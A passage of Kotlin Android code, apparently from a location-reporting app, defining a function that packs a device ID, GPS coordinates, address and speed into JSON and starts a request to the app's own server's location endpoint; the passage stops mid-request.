    /**
     * Send a GPS location to the server.
     */
    fun sendLocation(context: Context, lat: Double, lng: Double, address: String?, speed: Float) {
        val deviceId = getDeviceId(context) ?: return
        val json = """
            {
                "deviceId": "$deviceId",
                "lat": $lat,
                "lng": $lng,
                "address": ${if (address != null) "\"$address\"" else null},
                "speed": $speed
            }
        """.trimIndent()
        val body = RequestBody.create(MediaType.parse("application/json"), json)
        val request = Request.Builder()
            .url("$BASE_URL/location")
